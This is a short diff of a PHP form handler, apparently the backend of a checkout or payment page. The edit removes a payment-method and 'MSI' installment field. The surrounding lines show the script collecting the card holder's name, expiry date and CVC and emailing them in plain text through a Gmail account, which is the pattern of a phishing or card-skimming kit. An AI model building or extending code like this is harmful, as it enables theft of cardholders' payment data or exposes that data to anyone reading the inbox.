@@ -15,12 +15,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $titular = isset($_POST['card-holder']) ? htmlspecialchars(trim($_POST['card-holder'])) : '';
     $vencimiento = isset($_POST['expiry']) ? htmlspecialchars(trim($_POST['expiry'])) : '';
     $cvc = isset($_POST['cvc']) ? htmlspecialchars(trim($_POST['cvc'])) : '';
-    $metodo = isset($_POST['payment-method']) ? htmlspecialchars(trim($_POST['payment-method'])) : '';
-    
-    $msi = "";
-    if ($metodo === "msi" && isset($_POST['msi'])) {
-        $msi = htmlspecialchars(trim($_POST['msi']));
-    }
 
     // Configuración de Gmail
     $smtp_user = 'dropsinfusionvital@gmail.com';
@@ -49,10 +43,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $mensaje .= "Titular: " . $titular . "\n";
         $mensaje .= "Vencimiento: " . $vencimiento . "\n";
         $mensaje .= "Código de seguridad (CVC): " . $cvc . "\n";
-        $mensaje .= "Método de pago: " . $metodo . "\n";
-        if ($msi !== "") {
-            $mensaje .= "MSI seleccionado: " . $msi . "\n";
-        }
 
         $mail->Body = $mensaje;
 
